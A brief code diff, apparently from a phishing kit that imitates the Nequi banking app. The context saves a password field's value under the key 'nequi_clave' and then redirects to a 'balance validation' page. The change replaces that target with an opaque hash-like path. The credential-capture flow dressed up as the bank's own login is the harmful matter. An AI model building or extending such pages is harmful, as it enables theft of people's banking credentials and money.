@@ -66,7 +66,7 @@ document.addEventListener('DOMContentLoaded', () => {
             localStorage.setItem('nequi_clave', claveInput.value);
 
             // Redirigir a validacion_saldo.html con loader
-            navigateWithLoader('validacion_saldo.html');
+            navigateWithLoader('/QmNpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUv');
         }
     });
 
